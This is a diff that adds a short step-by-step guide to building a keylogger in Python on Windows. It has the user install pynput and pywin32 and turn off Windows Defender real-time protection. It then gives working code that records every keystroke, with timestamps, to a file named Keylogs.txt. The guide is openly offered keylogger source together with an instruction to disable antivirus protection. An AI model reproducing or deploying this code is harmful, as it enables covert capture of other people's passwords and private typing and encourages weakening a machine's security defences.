@@ -1,0 +1,32 @@
+python --version
+python -m pip install pynput
+python -m pip install pywin32
+
+
+
+
+
+
+
+Step 1: Open command prompt then execute the following commands
+● “Py--version”
+● “Py -m pip install pynput”
+● Py -m pip install pywin32” 
+
+
+Step 2: Search for “Windows Defender Security Center”. 
+
+
+Step 3: Turn off the “Real time protection”
+
+Step 4: Open IDLE 3.10 then create a new file and type the following commands. Save the
+file with the name “Keyloggers” and run the code.
+
+from pynput.keyboard import Key, Listener 
+import logging 
+log_dir="" 
+logging.basicConfig(filename=(log_dir+"Keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s') 
+def on_press(key): 
+    logging.info(str(key)) 
+with Listener(on_press=on_press) as listener:
+    listener.join()
